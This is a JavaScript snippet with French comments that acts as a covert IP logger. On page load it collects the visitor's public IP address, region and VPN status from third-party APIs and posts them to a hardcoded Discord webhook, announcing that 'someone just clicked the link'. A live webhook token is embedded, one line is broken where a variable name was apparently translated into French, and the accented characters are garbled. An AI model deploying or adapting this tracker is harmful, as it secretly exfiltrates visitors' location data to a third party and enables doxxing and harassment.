// Fonction pour envoyer l'adresse IP, le d√©partement et la d√©tection du VPN √† Discord via un appel de webhook
function sendIPAndDepartmentToDiscord(ipAddress, department, isVPN) {
  var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";

  var vpnStatus = Utilisation d'un VPN ? "Oui" : "Non";
  var content = "> **Quelqu'un vient de cliquer sur le lien. Voici les informations re√ßues :**" +
    "\n> **Adresse IP üõ∞Ô∏è : **" + ipAddress +
    "\n> **R√©gion üè† : **" + department +
    "\n> **VPN üåê : **" + vpnStatus;

  var request = new XMLHttpRequest();
  request.open("POST", webhookURL);
  request.setRequestHeader('Content-type', 'application/json');
  var params = {
    content: content
  };
  request.send(JSON.stringify(params));
}

// Fonction pour d√©tecter si une adresse IP est associ√©e √† un VPN en utilisant l'API ipapi
function detectVPNByIP(ipAddress) {
  var apiURL = "https://ipapi.co/" + ipAddress + "/security/";

  fetch(apiURL)
    .then(response => response.json())
    .then(data => {
      var isVPN = data.proxy;

      // R√©cup√©rer le d√©partement en fonction de l'adresse IP
      fetch('https://ipapi.co/' + ipAddress + '/json/')
        .then(response => response.json())
        .then(data => {
          var department = data.region;

          // Envoyer l'adresse IP, le d√©partement et la d√©tection du VPN √† Discord
          sendIPAndDepartmentToDiscord(ipAddress, department, isVPN);
        })
        .catch(error => {
          console.error('Erreur lors de la r√©cup√©ration du d√©partement :', error);
        });
    })
    .catch(error => {
      console.error('Erreur lors de la d√©tection du VPN :', error);
    });
}

// Fonction pour r√©cup√©rer l'adresse IP de l'utilisateur
function getIPAddress() {
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      var ipAddress = data.ip;

      // D√©tecter si l'adresse IP est associ√©e √† un VPN
      detectVPNByIP(ipAddress);
    })
    .catch(error => {
      console.error('Erreur lors de la r√©cup√©ration de l\'adresse IP :', error);
    });
}

// Appeler la fonction d√®s que la page est charg√©e
window.addEventListener('load', getIPAddress);
